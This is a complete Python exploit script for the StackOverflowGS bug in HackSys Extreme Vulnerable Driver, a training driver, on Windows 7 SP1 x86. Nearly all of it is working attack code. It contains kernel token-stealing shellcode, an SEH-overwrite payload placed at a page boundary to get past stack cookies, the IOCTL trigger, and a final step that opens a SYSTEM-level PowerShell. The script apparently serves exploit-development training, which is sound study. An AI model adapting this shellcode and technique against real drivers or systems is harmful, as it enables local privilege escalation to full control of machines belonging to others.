#!/usr/bin/python
#
# HEVD StackOverflowGS exploit for Windows 7 SP1 x86 by @acru3l.
#

import sys
import struct
from ctypes import *

device_name = r'\\.\HackSysExtremeVulnerableDriver'

# assembled with WinDBG
shellcode = ''
shellcode += '\x60'                             # pushad
shellcode += '\x31\xc0'                         # xor     eax,eax
shellcode += '\x64\x8b\x80\x24\x01\x00\x00'     # mov     eax,dword ptr fs:[eax+124h] ; 0x124 = offset nt!_KPCR.PcrbData.CurrentThread
shellcode += '\x8b\x40\x50'                     # mov     eax,dword ptr [eax+50h]     ; 0x50 = offset nt!_KTHREAD.ApcState.Process
shellcode += '\x8b\xc8'                         # mov     ecx,eax
shellcode += '\xba\x04\x00\x00\x00'             # mov     edx,4
shellcode += '\x8b\x80\xb8\x00\x00\x00'         # mov     eax,dword ptr [eax+0B8h]    ; 0xB8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
shellcode += '\x2d\xb8\x00\x00\x00'             # sub     eax,0B8h
shellcode += '\x39\x90\xb4\x00\x00\x00'         # cmp     dword ptr [eax+0B4h],edx    ; 0xB4 = offset nt!_EPROCESS.UniqueProcessId
shellcode += '\x75\xed'                         # jne     $-17
shellcode += '\x8b\x90\xf8\x00\x00\x00'         # mov     edx,dword ptr [eax+0F8h]    ; 0xF8 = offset nt!_EPROCESS.Token
shellcode += '\x89\x91\xf8\x00\x00\x00'         # mov     dword ptr [ecx+0F8h],edx
shellcode += '\x61'                             # popad
shellcode += '\x81\xc4\xc8\x09\x00\x00'         # add     esp,9C8h
shellcode += '\x5d'                             # pop     ebp                         ; restore ebp
shellcode += '\x8b\x7c\x24\x04'                 # mov     edi,dword ptr [esp+4]       ; restore edi
shellcode += '\x8b\x74\x24\x08'                 # mov     esi,dword ptr [esp+8]       ; restore esi
shellcode += '\x31\xc0'                         # xor     eax,eax
shellcode += '\xc2\x08\x00'                     # ret     8 -> returns to HEVD!IrpDeviceIoCtlHandler+0xdf

hFile = windll.kernel32.CreateFileA(device_name,
                                0xC0000000,     # GENERIC_READ | GENERIC_WRITE
                                0x00000001,     # FILE_SHARE_READ
                                0,              # NULL
                                3,              # OPEN_EXISTING
                                0x80,           # FILE_ATTRIBUTE_NORMAL
                                0)              # NULL

if hFile == -1:
    print '[-] Failed to open device: %s' % device_name
    sys.exit(1)
print '[+] Device opened successfully: %s' % device_name

# this might not be page-aligned
buff_ptr = windll.kernel32.VirtualAlloc(0,
                                0x3000,
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE

if buff_ptr == 0:
    print '[-] Failed to allocate buffer'
    sys.exit(1)

# get ptr to the first page
page_ptr = (buff_ptr + 0xfff) & 0xfffff000
print '[+] Address of the first page: 0x%08x' % page_ptr

# release (decommit) the second page
print '[+] Releasing the second page'
retval = windll.kernel32.VirtualFree(page_ptr + 0x1000,
                                0x1000,
                                0x4000)         # MEM_DECOMMIT

if retval == 0:
    print '[-] Failed to release the second page'
    sys.exit(1)

# smashing CPPEH_RECORD on the stack
payload = 'A' * 0x204
payload += 'BBBB'                               # CPPEH_RECORD.old_esp
payload += 'CCCC'                               # CPPEH_RECORD.exc_ptr
payload += 'DDDD'                               # CPPEH_RECORD.registration.Next
payload += struct.pack('<L', page_ptr)          # ExceptionHandler!
payload_buffer = create_string_buffer(payload)

padding = '\xcc' * (0x1000 - len(shellcode) - len(payload))

# +-----------+---------+---------+---------------------------------+
# | shellcode | padding | payload |           unused page           |
# +-----------+---------+---------+---------------------------------+
memmove(page_ptr, shellcode + padding + payload, 0x1000)
payload_ptr = page_ptr + 0x1000 - len(payload)

print '[+] Triggering stack buffer overflow'

ioctl_code = 0x222007    # call StackOverflowGSIoctlHandler
windll.kernel32.DeviceIoControl(hFile,
                                ioctl_code,
                                payload_ptr,
                                len(payload) + 1,
                                0,
                                0,
                                byref(c_int(0)),
                                0)

# Got SYSTEM shell?
import os
os.system("powershell.exe")
